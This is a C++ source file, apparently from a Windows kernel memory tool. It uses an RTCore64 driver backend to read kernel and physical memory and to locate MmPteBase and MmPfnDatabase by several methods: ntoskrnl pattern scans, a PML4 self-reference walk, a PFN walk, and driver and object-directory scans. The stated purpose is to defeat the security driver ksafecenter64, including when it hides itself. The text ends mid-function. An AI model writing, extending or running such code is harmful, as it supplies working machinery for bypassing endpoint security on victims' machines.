#include "pte.h"
#include "kutil.h"
#include "driver/IDriverBackend.h"
#include "globals.h"
#include <cstdio>
#include <vector>
#include <map>
#include <set>
#include <algorithm>
#include <utility>
#include <Psapi.h>

static DWORD64 s_pteBase = 0;

void PteResetCache() { s_pteBase = 0; }

// ── Shared ntoskrnl loader ────────────────────────────────────────────────────
struct ExecSection {
    DWORD foa;   // file offset of raw bytes
    DWORD sz;    // raw size (bytes to scan)
    DWORD rva;   // virtual address of first byte
};

struct NtoskrnlImage {
    std::vector<BYTE>       buf;
    DWORD64                 kBase   = 0;
    DWORD                   textRVA = 0, textFOA = 0, textSz = 0;
    DWORD                   dataRVA = 0, dataEnd = 0;
    std::vector<ExecSection> execSecs;   // all executable sections
    bool                    ok      = false;
};

static NtoskrnlImage LoadNtoskrnl() {
    NtoskrnlImage img;
    LPVOID d[1024]; DWORD cb;
    if (!EnumDeviceDrivers(d, sizeof(d), &cb)) return img;
    img.kBase = (DWORD64)d[0];

    WCHAR drvPath[MAX_PATH], filePath[MAX_PATH];
    if (!GetDeviceDriverFileNameW(d[0], drvPath, MAX_PATH)) return img;
    if (_wcsnicmp(drvPath, L"\\SystemRoot\\", 12) == 0) {
        WCHAR winDir[MAX_PATH]; GetWindowsDirectoryW(winDir, MAX_PATH);
        swprintf_s(filePath, MAX_PATH, L"%s\\%s", winDir, drvPath + 12);
    } else {
        WCHAR winDir[MAX_PATH]; GetWindowsDirectoryW(winDir, MAX_PATH);
        swprintf_s(filePath, MAX_PATH, L"%s\\System32\\ntoskrnl.exe", winDir);
    }

    HANDLE hf = CreateFileW(filePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hf == INVALID_HANDLE_VALUE) return img;
    DWORD sz = GetFileSize(hf, NULL);
    img.buf.resize(sz);
    DWORD rd; bool ok = ReadFile(hf, img.buf.data(), sz, &rd, NULL) && rd == sz;
    CloseHandle(hf);
    if (!ok) return img;

    auto* dos = reinterpret_cast<IMAGE_DOS_HEADER*>(img.buf.data());
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return img;
    auto* nt = reinterpret_cast<IMAGE_NT_HEADERS64*>(img.buf.data() + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return img;

    const DWORD EXEC_FLAGS = IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE;
    auto* sec = IMAGE_FIRST_SECTION(nt); WORD nSec = nt->FileHeader.NumberOfSections;
    for (WORD i = 0; i < nSec; i++) {
        char name[9] = {}; memcpy(name, sec[i].Name, 8);
        if (strcmp(name, ".text") == 0) {
            img.textRVA = sec[i].VirtualAddress;
            img.textFOA = sec[i].PointerToRawData;
            img.textSz  = sec[i].SizeOfRawData;
        }
        // Accumulate ALL writable non-executable data sections as valid global targets.
        // MmPteBase may live in PAGEDATA, .bss extensions, or other non-.data segments —
        // restricting to just ".data" by name misses variables beyond .data's VirtualSize.
        {
            const DWORD NOT_EXEC = IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_DISCARDABLE;
            const DWORD HAS_DATA = IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_CNT_UNINITIALIZED_DATA;
            if (!(sec[i].Characteristics & NOT_EXEC) && (sec[i].Characteristics & HAS_DATA)) {
                DWORD secStart = sec[i].VirtualAddress;
                DWORD secEnd   = secStart + sec[i].Misc.VirtualSize;
                if (img.dataRVA == 0 || secStart < img.dataRVA) img.dataRVA = secStart;
                if (secEnd > img.dataEnd) img.dataEnd = secEnd;
            }
        }
        // Collect all executable sections for MmPfnDatabase pattern scan
        if ((sec[i].Characteristics & EXEC_FLAGS) && sec[i].SizeOfRawData > 0) {
            img.execSecs.push_back({sec[i].PointerToRawData,
                                    sec[i].SizeOfRawData,
                                    sec[i].VirtualAddress});
        }
    }
    img.ok = (img.textFOA != 0 && img.dataRVA != 0);
    return img;
}

// Decode a RIP-relative QWORD load/add: returns the target .data RVA or 0.
//   Recognises:
//     48/4C  8B  /r  imm32   MOV r64, [RIP+imm32]
//     48/4C  03  /r  imm32   ADD r64, [RIP+imm32]
//   where ModRM mod=00, r/m=101 (RIP-relative).
static DWORD DecodeRipRelDataRef(const BYTE* buf, DWORD foa, DWORD textFOA,
                                  DWORD textRVA, DWORD dataRVA, DWORD dataEnd) {
    BYTE rex = buf[foa], op = buf[foa+1], modrm = buf[foa+2];
    if (rex != 0x48 && rex != 0x4C) return 0;
    if (op != 0x8B && op != 0x03)   return 0;
    if ((modrm & 0xC7) != 0x05)     return 0; // mod=00, r/m=101
    INT32 off32    = *reinterpret_cast<const INT32*>(&buf[foa + 3]);
    DWORD instrRVA = (foa - textFOA) + textRVA;
    DWORD targetRVA = (DWORD)((INT64)instrRVA + 7 + off32);
    if (targetRVA >= dataRVA && targetRVA < dataEnd) return targetRVA;
    return 0;
}

// ── Method 1: MiGetPteAddress code-pattern scan ───────────────────────────────
//
// MiGetPteAddress on Win10 x64 always contains  sar rax, 9  (48 C1 F8 09)
// or  sar rcx, 9  (48 C1 F9 09) followed within ~50 bytes by a RIP-relative
// load/add of MmPteBase.  This pattern is unique to PTE helper routines and
// produces a single strong candidate regardless of reference-count ranking.
//
// Returns kernel VA of the MmPteBase *variable*.
static DWORD64 FindMmPteBaseByMiGetPtePattern(const NtoskrnlImage& img) {
    if (!img.ok) return 0;
    const BYTE* buf = img.buf.data();
    DWORD end = img.textFOA + img.textSz;

    // Collect candidate .data RVAs seen near a sar-by-9 anchor.
    // Use a map<RVA, hitCount> to pick the most-seen target if there are several.
    std::map<DWORD, int> hits;

    // Scan ALL executable sections (not just .text): MiGetPteAddress may live in
    // PAGE or other non-.text executable sections on some ntoskrnl builds.
    for (auto& esec : img.execSecs) {
        DWORD end = esec.foa + esec.sz;
        for (DWORD i = esec.foa; i + 4 < end; i++) {
        // Anchor: any right-shift of a 64-bit register by 9 or 12.
        //   SAR reg, N  =  REX.W  C1  /7 (ModRM: mod=11, reg=7, rm=reg)  N
        //   SHR reg, N  =  REX.W  C1  /5 (ModRM: mod=11, reg=5, rm=reg)  N
        // REX.W = 0x48 (rax..rdi) or 0x49 (r8..r15, REX.B extends rm).
        // ModRM: mod=11 → bits[7:6]=11; reg=7(SAR)→bits[5:3]=111; reg=5(SHR)→bits[5:3]=101
        //   SAR: ModRM & 0xF8 == 0xF8  (11 111 xxx)
        //   SHR: ModRM & 0xF8 == 0xE8  (11 101 xxx)
        if ((buf[i] != 0x48 && buf[i] != 0x49) || buf[i+1] != 0xC1) continue;
        BYTE shiftAmt = buf[i+3];
        if (shiftAmt != 0x09 && shiftAmt != 0x0C) continue; // shift by 9 or 12
        BYTE modrm = buf[i+2];
        bool isSar = (modrm & 0xF8) == 0xF8;
        bool isShr = (modrm & 0xF8) == 0xE8;
        if (!isSar && !isShr) continue;

        // Found anchor.  Scan a window of [-16, +80] bytes around it.
        DWORD wStart = (i > esec.foa + 16) ? (i - 16) : esec.foa;
        DWORD wEnd   = ((i + 80 + 7) < end)  ? (i + 80) : (end - 7);

        for (DWORD j = wStart; j < wEnd; j++) {
            // Accept both ADD r64,[rip+X] (0x03) and MOV r64,[rip+X] (0x8B).
            // Win10 22H2 MiGetPteAddress uses MOV r11,[MmPteBase] then register ADD,
            // so we must count MOV references too to find the right variable.
            if (j + 6 >= end) continue;
            BYTE rex = buf[j], op = buf[j+1], modrm = buf[j+2];
            if (rex != 0x48 && rex != 0x4C) continue;
            if (op != 0x03 && op != 0x8B) continue; // ADD or MOV (RIP-relative)
            if ((modrm & 0xC7) != 0x05) continue; // mod=00, r/m=101 (RIP-rel)
            INT32 off32    = *reinterpret_cast<const INT32*>(&buf[j + 3]);
            DWORD instrRVA = (j - esec.foa) + esec.rva;
            DWORD targetRVA = (DWORD)((INT64)instrRVA + 7 + off32);
            if (targetRVA >= img.dataRVA && targetRVA < img.dataEnd)
                hits[targetRVA]++;
        }
        } // end inner for
    } // end execSecs loop
    if (hits.empty()) return 0;

    // Sort by hit count descending and validate runtime values.
    std::vector<std::pair<int,DWORD>> ranked;
    for (auto& kv : hits) ranked.push_back({kv.second, kv.first});
    std::sort(ranked.begin(), ranked.end(), [](auto& a, auto& b){ return a.first > b.first; });

    static const DWORD64 ALIGN_512G = (1ULL << 39) - 1;
    for (auto& [cnt, rva] : ranked) {
        DWORD64 varVA = img.kBase + rva;
        DWORD64 val   = g_drv->Rd64(varVA);
        if (g_debug)
            printf("[pte] MiGetPteAddr pattern: RVA=0x%08X hits=%d  val=0x%016llX\n",
                   rva, cnt, val);
        if (g_drv->IsKernelVA(val) && (val & ALIGN_512G) == 0) {
            printf("[pte] MiGetPteAddr pattern: RVA=0x%08X hits=%d  MmPteBase=0x%016llX\n",
                   rva, cnt, val);
            return varVA;
        }
    }
    printf("[pte] MiGetPteAddr pattern: no valid candidate\n");
    return 0;
}

// ── MmPfnDatabase locator (pattern scan) ─────────────────────────────────────
//
// Every PFN array access computes:
//     pfnEntry = MmPfnDatabase + pfn * sizeof(_MMPFN)
//
// sizeof(_MMPFN) varies by build (0x28, 0x30, 0x38 or 0x40 observed on x64).
// The multiply appears as  IMUL r64, r/m64, imm8  (REX.W 6B /r imm8).
// Nearby (within ±96 bytes) there is always a RIP-relative QWORD load of
// MmPfnDatabase:  MOV r64, [RIP+X]  targeting .data.
//
// We scan ALL executable sections (not just .text) because on ntoskrnl the
// paging code lives in the PAGE section, not .text.
//
// Returns the RUNTIME VALUE of MmPfnDatabase (PFN array base).
static DWORD64 FindMmPfnDatabaseByPattern(const NtoskrnlImage& img) {
    if (!img.ok || img.execSecs.empty()) return 0;
    const BYTE* buf = img.buf.data();

    // Known sizeof(_MMPFN) values across Win10/11 x64 builds
    static const BYTE kStrides[] = { 0x28, 0x30, 0x38, 0x40 };

    std::map<DWORD, int> hits;   // .data RVA → weighted hit count

    for (auto& sec : img.execSecs) {
        DWORD secEnd = sec.foa + sec.sz;

        for (DWORD i = sec.foa; i + 4 < secEnd; i++) {
            // IMUL r64, r/m64, imm8 = REX.W(48/49/4C/4D) 6B ModRM(mod=11) imm8
            BYTE rex = buf[i];
            if (rex != 0x48 && rex != 0x49 && rex != 0x4C && rex != 0x4D) continue;
            if (buf[i+1] != 0x6B) continue;
            if ((buf[i+2] & 0xC0) != 0xC0) continue;  // mod = 11

            BYTE imm8 = buf[i+3];
            bool strideMatch = false;
            for (BYTE s : kStrides) if (imm8 == s) { strideMatch = true; break; }
            if (!strideMatch) continue;

            // Anchor found — scan ±96 bytes for MOV r64,[RIP+X] → .data
            DWORD wStart = (i > sec.foa + 96) ? (i - 96) : sec.foa;
            DWORD wEnd   = ((i + 96 + 7) < secEnd) ? (i + 96) : (secEnd > 7 ? secEnd - 7 : 0);

            for (DWORD j = wStart; j < wEnd; j++) {
                if (j + 6 >= secEnd) continue;
                BYTE jrex = buf[j], jop = buf[j+1], jmodrm = buf[j+2];
                if (jrex != 0x48 && jrex != 0x4C) continue;
                if (jop != 0x8B) continue;              // MOV r64, [mem]
                if ((jmodrm & 0xC7) != 0x05) continue; // RIP-relative

                INT32 off32    = *reinterpret_cast<const INT32*>(&buf[j + 3]);
                DWORD instrRVA = (j - sec.foa) + sec.rva;
                DWORD targetRVA = (DWORD)((INT64)instrRVA + 7 + off32);
                if (targetRVA >= img.dataRVA && targetRVA < img.dataEnd)
                    hits[targetRVA]++;
            }
        }
    }
    if (hits.empty()) return 0;

    // Sort by hit count; pick first whose runtime value is a page-aligned kernel VA.
    std::vector<std::pair<int,DWORD>> ranked;
    for (auto& kv : hits) ranked.push_back({kv.second, kv.first});
    std::sort(ranked.begin(), ranked.end(), [](auto& a, auto& b){ return a.first > b.first; });

    for (auto& [cnt, rva] : ranked) {
        DWORD64 varVA = img.kBase + rva;
        DWORD64 val   = g_drv->Rd64(varVA);
        if (g_drv->IsKernelVA(val) && (val & 0xFFF) == 0) {
            printf("[pte] MmPfnDatabase pattern: RVA=0x%08X hits=%d  array=0x%016llX\n",
                   rva, cnt, val);
            return val;
        }
        if (g_debug)
            printf("[pte] MmPfnDatabase pattern: RVA=0x%08X hits=%d  val=0x%016llX (skip)\n",
                   rva, cnt, val);
    }
    printf("[pte] MmPfnDatabase pattern: no valid candidate\n");
    return 0;
}

// ── Method 0a: PML4 self-ref brute-force via virtual PTE read ─────────────────
//
// ALGORITHM:
//   There are only 256 possible PML4 indices for the kernel half (256–511).
//   For each candidate index 'i':
//     MmPteBase_candidate = 0xFFFF000000000000 | (i << 39)
//     PTE_VA = MmPteBase_candidate + (kBase >> 9)
//   Read 8 bytes from PTE_VA.  A valid ntoskrnl PTE must be:
//     - present (bit 0 = 1)
//     - kernel-mode (U/S = 0)
//     - PA in expected physical RAM range (PA > 0x1000 and < 0x1_0000_0000)
//
//   No MapPhys, no MmPfnDatabase, no MmPteBase global — pure virtual reads.
//   Security software cannot intercept this without breaking all memory access.
//
// Returns MmPteBase value, or 0 on failure.
// ── Method 0a: PML4 self-reference via MapPhys (hardware level, no kernel globals)
//
// Read CR3 from System EPROCESS.DirectoryTableBase (+0x28).
// Map the PML4 physical page via RTCore64's MmMapIoSpace IOCTL.
// Scan entries [256..511] for the self-referencing entry (PA points to PML4 itself).
// MmPteBase = 0xFFFF000000000000 | (self_ref_index << 39).
//
// This is completely independent of ntoskrnl globals that ksafecenter64 patches.
// Safe: MapPhys reads physical RAM, no virtual address guessing, no BSOD risk.
static DWORD64 FindMmPteBaseByCR3Walk() {
    // 1. System EPROCESS via PsInitialSystemProcess export
    DWORD64 sysEP = g_drv->Rd64(KUtil::KernelExport("PsInitialSystemProcess"));
    if (!g_drv->IsKernelVA(sysEP)) {
        printf("[pte] PML4Walk: PsInitialSystemProcess unavailable\n");
        return 0;
    }

    // 2. CR3 = EPROCESS.DirectoryTableBase (_KPROCESS+0x28)
    DWORD64 cr3 = g_drv->Rd64(sysEP + 0x28);
    if (!cr3) {
        printf("[pte] PML4Walk: CR3 read returned 0\n");
        return 0;
    }

    // Clear low 12 bits (PCID, flags) to get raw PML4 physical address
    DWORD64 pml4_pa = cr3 & 0x000FFFFFFFFFF000ULL;

    // 3. Map PML4 physical page via RTCore64 MmMapIoSpace IOCTL
    DWORD64 pml4_va = g_drv->MapPhys(pml4_pa, 4096);
    if (!pml4_va) {
        if (g_debug)
            printf("[pte] PML4Walk: MapPhys(PA=0x%012llX) failed\n", pml4_pa);
        return 0;
    }

    // 4. Scan PML4 entries [256..511] for self-reference
    //    Each entry: bits[51:12] = physical page number of next-level table.
    //    Self-ref: entry's PA == PML4's own PA.
    DWORD64 result = 0;
    for (int i = 256; i < 512; i++) {
        DWORD64 entry    = g_drv->Rd64(pml4_va + (DWORD64)i * 8);
        DWORD64 entry_pa = entry & 0x000FFFFFFFFFF000ULL;
        if (!entry_pa) continue;    // not present or not mapped
        if (entry_pa == pml4_pa) {
            // Self-reference at PML4[i] → MmPteBase = sign_extended(i << 39)
            result = 0xFFFF000000000000ULL | ((DWORD64)i << 39);
            printf("[pte] PML4Walk: self-ref at PML4[%d=0x%X]  CR3=0x%llX  MmPteBase=0x%016llX\n",
                   i, i, cr3, result);
            break;
        }
    }

    // 5. Unmap physical page
    g_drv->UnmapPhys(pml4_va, 4096);

    if (!result)
        printf("[pte] PML4Walk: no self-reference found in PML4[256..511]\n");
    return result;
}

// ── Method 0b: CR3 physical walk via MmPfnDatabase ───────────────────────────
//
// Reads EPROCESS.DirectoryTableBase (CR3 physical) for the System process,
// then follows the PFN database entry for that physical page to recover
// the PteAddress field (_MMPFN+0x18).  PteAddress is always inside the PTE
// self-map, so masking off the low 39 bits directly yields MmPteBase.
//
// MmPfnDatabase is located via export table first; if missing (some 19041
// builds do not export it) we fall back to the IMUL-0x30 pattern scan.
//
// Returns the VALUE of MmPteBase directly (not a varVA); 0 on failure.
static DWORD64 FindMmPteBaseByPhysWalk(const NtoskrnlImage& img) {
    // 1. System process EPROCESS
    DWORD64 sysEPROCESS = g_drv->Rd64(KUtil::KernelExport("PsInitialSystemProcess"));
    if (!g_drv->IsKernelVA(sysEPROCESS)) return 0;

    // 2. CR3 = DirectoryTableBase at EPROCESS+0x28 (_KPROCESS.DirectoryTableBase)
    DWORD64 cr3 = g_drv->Rd64(sysEPROCESS + 0x28);
    if (!cr3) return 0;
    DWORD64 pfn = cr3 >> 12;   // bits[11:0] may be PCID; PFN is bits[63:12]
    if (g_debug)
        printf("[pte] PhysWalk: EPROCESS=0x%016llX  CR3=0x%016llX  PFN=0x%llX\n",
               sysEPROCESS, cr3, pfn);

    // 3. MmPfnDatabase: try export first, then pattern scan
    DWORD64 pfnArray = 0;
    DWORD64 pfnDbVarVA = KUtil::KernelExport("MmPfnDatabase");
    if (pfnDbVarVA) {
        pfnArray = g_drv->Rd64(pfnDbVarVA);
        if (!g_drv->IsKernelVA(pfnArray)) pfnArray = 0;
    }
    if (!pfnArray) {
        pfnArray = FindMmPfnDatabaseByPattern(img);
    }
    if (!pfnArray) return 0;
    if (g_debug)
        printf("[pte] PhysWalk: MmPfnDatabase=0x%016llX\n", pfnArray);

    // 4-6. Try all sizeof(_MMPFN) strides × all known PteAddress offsets.
    //   sizeof(_MMPFN) observed on x64 Windows: 0x28, 0x30, 0x38, 0x40
    //   PteAddress offset: +0x08, +0x10, +0x18 (varies by build)
    static const DWORD kStrides[] = { 0x28, 0x30, 0x38, 0x40 };
    static const DWORD kPteOffsets[] = { 0x08, 0x10, 0x18 };
    static const DWORD64 ALIGN_512G = (1ULL << 39) - 1;

    for (DWORD stride : kStrides) {
        DWORD64 pfnEntryVA = pfnArray + pfn * stride;
        if (!g_drv->IsKernelVA(pfnEntryVA)) continue;
        for (DWORD off : kPteOffsets) {
            DWORD64 readVA = pfnEntryVA + off;
            if (readVA < pfnEntryVA) continue;          // overflow guard
            if (!g_drv->IsKernelVA(readVA)) continue;  // range guard
            DWORD64 pteAddr   = g_drv->Rd64(readVA);
            DWORD64 candidate = pteAddr & ~ALIGN_512G;
            if (g_debug)
                printf("[pte] PhysWalk:   stride=0x%02X off=+0x%02X  pteAddr=0x%016llX  cand=0x%016llX\n",
                       stride, off, pteAddr, candidate);
            if (!g_drv->IsKernelVA(pteAddr)) continue;
            if (!g_drv->IsKernelVA(candidate) || (candidate & ALIGN_512G)) continue;
            printf("[pte] MmPteBase = 0x%016llX  (stride=0x%02X pteOff=+0x%02X)\n",
                   candidate, stride, off);
            return candidate;
        }
    }
    return 0;
}

// ── Method 0c: scan loaded kernel drivers for stored MmPteBase ───────────────
//
// A security driver that patches ntoskrnl's MmPteBase must retain the real
// value internally so that it can still locate PTEs for its own operations.
// Scanning every loaded kernel driver's non-pageable data sections for
// 512 GB-aligned kernel VAs finds that internal copy.
//
// SAFETY: We only touch sections that are guaranteed non-pageable:
//   – section names starting with "PAGE" or equal to "INIT" are skipped
//   – IMAGE_SCN_MEM_DISCARDABLE sections are skipped
//   – sections without any data characteristics are skipped
// Non-pageable driver sections are locked in RAM by the kernel loader and
// can never fault, so RTCore64 reads are safe there.
//
// PE layout is parsed from the on-disk file (no kernel reads for metadata).
// ntoskrnl (index 0 in EnumDeviceDrivers) is skipped — its copy is the
// poisoned one we are trying to work around.
//
// Returns the MmPteBase VALUE (not a variable VA); 0 if not found.
static DWORD64 FindMmPteBaseByDriverScan(bool verbose = false) {
    LPVOID devs[1024]; DWORD cb;
    if (!EnumDeviceDrivers(devs, sizeof(devs), &cb)) return 0;
    DWORD numDrv = cb / sizeof(LPVOID);

    static const DWORD64 ALIGN_512G  = (1ULL << 39) - 1;
    static const DWORD   MAX_SECSIZE = 2 * 1024 * 1024; // skip sections > 2 MB

    // Well-known 512GB-aligned Windows kernel constants that are NOT MmPteBase.
    // These appear in win32k, HAL, etc. as address-space boundary markers.
    static const DWORD64 kFalsePos[] = {
        0xFFFF800000000000ULL,   // MmSystemRangeStart / kernel space base
        0xFFFFFE0000000000ULL,   // Session space base (PML4[508])
        0xFFFFFF0000000000ULL,   // Hyperspace upper boundary (PML4[510])
        0xFFFF000000000000ULL,   // 48-bit non-canonical boundary
        0xFFFFF80000000000ULL,   // System module base constant
        0xFFFFFFFFFFFFF000ULL,   // Common -PAGE sentinel
    };
    auto IsKnownConstant = [](DWORD64 v) {
        for (auto c : kFalsePos) if (v == c) return true;
        return false;
    };

    // Pass 1: scan ksafecenter64 specifically (authoritative — it's the patcher).
    // Pass 2: scan all other third-party drivers (skip MS system DLLs).
    // MS system DLL name fragments to skip in pass 2:
    static const char* kMsNames[] = {
        "win32k", "hal.", "kd.", "cdd.", "dxg", "ntdll",
        "clfs", "bth", "ndis", "tcpip", "http", "nsiproxy", nullptr
    };
    auto IsMsDriver = [](const char* bn) {
        static const char* kSkip[] = {
            "win32k", "hal.", "kd.", "cdd.", "dxg", "ntdll",
            "clfs", "ndis", "tcpip", "http", nullptr
        };
        char lower[MAX_PATH]; strncpy_s(lower, bn, MAX_PATH); _strlwr_s(lower, MAX_PATH);
        for (int i = 0; kSkip[i]; i++) if (strstr(lower, kSkip[i])) return true;
        return false;
    };
    (void)kMsNames;

    DWORD64 result = 0;

    for (int pass = 0; pass < 2 && !result; pass++) {
    for (DWORD di = 1; di < numDrv; di++) {   // di=0 is ntoskrnl — skip
        DWORD64 drvKBase = (DWORD64)devs[di];
        if (!g_drv->IsKernelVA(drvKBase)) continue;

        // Resolve driver file path
        WCHAR wpath[MAX_PATH];
        if (!GetDeviceDriverFileNameW(devs[di], wpath, MAX_PATH)) continue;

        // Short module name (used for pass filtering and logging)
        char drvName[MAX_PATH];
        WideCharToMultiByte(CP_ACP, 0, wpath, -1, drvName, MAX_PATH, nullptr, nullptr);
        char* bn = strrchr(drvName, '\\');
        if (!bn) bn = drvName; else ++bn;
        char bnLower[MAX_PATH]; strncpy_s(bnLower, bn, MAX_PATH); _strlwr_s(bnLower, MAX_PATH);

        // Pass 0: only ksafecenter64 (the driver known to patch MmPteBase)
        if (pass == 0 && !strstr(bnLower, "ksafe")) continue;
        // Pass 1: skip MS system DLLs (they store 512GB constants for other purposes)
        if (pass == 1 && (strstr(bnLower, "ksafe") || IsMsDriver(bn))) continue;

        WCHAR fullPath[MAX_PATH];
        if (_wcsnicmp(wpath, L"\\SystemRoot\\", 12) == 0) {
            WCHAR winDir[MAX_PATH]; GetWindowsDirectoryW(winDir, MAX_PATH);
            swprintf_s(fullPath, MAX_PATH, L"%s\\%s", winDir, wpath + 12);
        } else {
            wcscpy_s(fullPath, MAX_PATH, wpath);
        }

        // Load from disk for PE header parsing (no kernel reads for metadata).
        // Fallback paths for drivers with NT-style paths (\Device\..., \??\...).
        HANDLE hf = CreateFileW(fullPath, GENERIC_READ, FILE_SHARE_READ,
                                nullptr, OPEN_EXISTING, 0, nullptr);
        if (hf == INVALID_HANDLE_VALUE) {
            // Try %SystemRoot%\System32\drivers\<basename>
            WCHAR sysDrv[MAX_PATH]; GetSystemDirectoryW(sysDrv, MAX_PATH);
            WCHAR* wbn = wcsrchr(wpath, L'\\');
            if (wbn) {
                swprintf_s(fullPath, MAX_PATH, L"%s\\drivers\\%s", sysDrv, wbn + 1);
                hf = CreateFileW(fullPath, GENERIC_READ, FILE_SHARE_READ,
                                 nullptr, OPEN_EXISTING, 0, nullptr);
            }
        }
        if (hf == INVALID_HANDLE_VALUE) {
            if (verbose) printf("  [!] cannot open file for %s\n", bn);
            continue;
        }
        DWORD fsz = GetFileSize(hf, nullptr);
        bool loadOk = false;
        std::vector<BYTE> fbuf;
        if (fsz >= 0x200 && fsz <= 32*1024*1024) {
            fbuf.resize(fsz);
            DWORD rd;
            loadOk = ReadFile(hf, fbuf.data(), fsz, &rd, nullptr) && rd == fsz;
        }
        CloseHandle(hf);
        if (!loadOk) continue;

        // Validate PE
        auto* dos = reinterpret_cast<IMAGE_DOS_HEADER*>(fbuf.data());
        if (dos->e_magic != IMAGE_DOS_SIGNATURE) continue;
        auto* nt  = reinterpret_cast<IMAGE_NT_HEADERS64*>(fbuf.data() + dos->e_lfanew);
        if (nt->Signature != IMAGE_NT_SIGNATURE) continue;

        auto*  sec    = IMAGE_FIRST_SECTION(nt);
        WORD   numSec = nt->FileHeader.NumberOfSections;

        if (verbose)
            printf("  scan %-32s  kbase=0x%016llX  %u secs\n", bn, drvKBase, numSec);

        for (WORD si = 0; si < numSec && si < 96; si++) {
            char sname[9] = {}; memcpy(sname, sec[si].Name, 8);
            DWORD chars = sec[si].Characteristics;
            DWORD rva   = sec[si].VirtualAddress;
            DWORD vsz   = sec[si].Misc.VirtualSize;
            if (!vsz) vsz = sec[si].SizeOfRawData;
            if (!vsz || vsz > MAX_SECSIZE) continue;

            // Skip sections that may be paged or are not data
            if (strncmp(sname, "PAGE", 4) == 0) continue;      // paged
            if (strcmp (sname, "INIT")    == 0) continue;       // discarded
            if (strcmp (sname, ".rsrc")   == 0) continue;       // resources
            if (strcmp (sname, ".reloc")  == 0) continue;       // relocations
            if (chars & IMAGE_SCN_MEM_DISCARDABLE) continue;
            if (!(chars & (IMAGE_SCN_CNT_INITIALIZED_DATA |
                           IMAGE_SCN_CNT_UNINITIALIZED_DATA))) continue;

            DWORD64 secKBase = drvKBase + rva;
            DWORD   nQWords  = vsz / 8;

            if (verbose)
                printf("    %-8s  RVA=0x%05X  sz=0x%05X  kva=0x%016llX\n",
                       sname, rva, vsz, secKBase);

            for (DWORD qi = 0; qi < nQWords; qi++) {
                DWORD64 val = g_drv->Rd64(secKBase + qi * 8);
                if (!g_drv->IsKernelVA(val)) continue;
                if (val & ALIGN_512G)         continue;  // must be 512 GB-aligned
                DWORD pml4 = (DWORD)((val >> 39) & 0x1FF);
                if (pml4 < 256) continue;               // kernel half only [256..511]
                if (IsKnownConstant(val)) {
                    if (verbose)
                        printf("    [skip constant] %s+0x%04X = 0x%016llX\n",
                               sname, qi * 8, val);
                    continue;
                }

                printf("[drvscan] %s  %s+0x%04X = 0x%016llX  PML4[%u]  *** MmPteBase ***\n",
                       bn, sname, qi * 8, val, pml4);
                if (!result) result = val;
            }
        }
    } // end driver loop
    } // end pass loop
    if (verbose && !result)
        printf("  (no valid MmPteBase found in ksafecenter64 or third-party driver sections)\n");
    return result;
}

// ── Method 0e: Object directory walk → \Driver\ksafecenter64 → DriverStart ────
//
// Even if ksafecenter64 removes itself from PsLoadedModuleList and hides from
// EnumDeviceDrivers, its DRIVER_OBJECT still exists in the \Driver object
// directory (ObpRootDirectoryObject → \Driver → ksafecenter64).
//
// OBJECT_DIRECTORY has 37 hash buckets at +0x000.
// OBJECT_DIRECTORY_ENTRY: +0x00 ChainLink, +0x08 Object, +0x10 HashValue.
// OBJECT_HEADER before the object body, size = 0x38 on Win10 x64.
// DRIVER_OBJECT.DriverStart at body+0x10.
// DRIVER_OBJECT.DriverSection (unlinked LDR entry) at body+0x20 → DllBase @+0x30.
// ─────────────────────────────────────────────────────────────────────────────
static DWORD64 FindKsafecenterBaseByObjDir(bool verbose = false) {
    DWORD64 obpRootPtr = KUtil::KernelExport("ObpRootDirectoryObject");
    if (verbose) printf("  [0e] ObpRootDirectoryObject VA=0x%016llX\n", obpRootPtr);
    if (!obpRootPtr) { printf("  [0e] ObpRootDirectoryObject not exported\n"); return 0; }
    DWORD64 rootDir = g_drv->Rd64(obpRootPtr);
    if (verbose) printf("  [0e] rootDir body=0x%016llX\n", rootDir);
    if (!g_drv->IsKernelVA(rootDir)) { printf("  [0e] rootDir not kernel VA\n"); return 0; }

    // Helper: scan an OBJECT_DIRECTORY for an entry whose name matches nameAscii.
    // Returns the object body VA (i.e., pointer after OBJECT_HEADER).
    // OBJECT_DIRECTORY has 37 hash buckets at +0.
    // Each bucket is a POBJECT_DIRECTORY_ENTRY (8 bytes).
    // OBJECT_DIRECTORY_ENTRY: +0 ChainLink, +8 Object, +10 HashValue.
    // Object body name: read from OBJECT_HEADER_NAME_INFO, whose offset is
    // encoded in OBJECT_HEADER.InfoMask (+0x1A) bit 1 (name present = bit 1).
    // For simplicity we read the DriverName UNICODE_STRING from DRIVER_OBJECT
    // body+0x30 (Length) / body+0x38 (Buffer) to match; but we need to identify
    // DRIVER_OBJECTs first.  Instead, for the \Driver directory scan we read the
    // name from OBJECT_HEADER_NAME_INFO which precedes the header:
    //   OBJECT_HEADER_NAME_INFO.Name.Buffer at [header - offset + 0x10]
    // The offset from the object body back to OBJECT_HEADER = 0x38.
    // InfoMask bits → optional header sizes (cumulative):
    //   bit0 (CreatorInfo) = 0x20, bit1 (NameInfo) = 0x20, bit2 (HandleInfo) = 0x10
    //   bit3 (QuotaInfo) = 0x40, bit4 (ProcessInfo) = 0x10, bit5 (AuditInfo) = 0x08
    //   bit6 (ExtendedInfo) = 0x10, bit7 (PaddingInfo) = 0x04
    // Name info block offset = sum of optional headers for bits set BEFORE bit1.
    // i.e., if bit0 is also set, OBJECT_HEADER_NAME_INFO is at hdr - 0x40, else - 0x20.
    // OBJECT_HEADER_NAME_INFO:
    //   +0x00 Directory   POBJECT_DIRECTORY
    //   +0x08 Name        UNICODE_STRING  (Length=+8, MaxLength=+A, Buffer=+10)

    // Read object name from OBJECT_HEADER_NAME_INFO.
    // OBJECT_HEADER is 0x30 bytes (Win10 x64); InfoMask at +0x1A (bit1=NameInfo present).
    // NameInfo block precedes header; offset = 0x20 + (0x20 if CreatorInfo/bit0 also set).
    auto ReadObjName = [&](DWORD64 objBody, WCHAR* out, int outCch) -> bool {
        DWORD64 hdr      = objBody - 0x30;   // OBJECT_HEADER size = 0x30
        BYTE    infomask = (BYTE)(g_drv->Rd64(hdr + 0x18) >> 16 & 0xFF);
        if (!(infomask & 2)) return false;   // bit1 = NameInfo present
        DWORD64 niOff = (infomask & 1) ? 0x40 : 0x20;  // +0x20 if CreatorInfo precedes
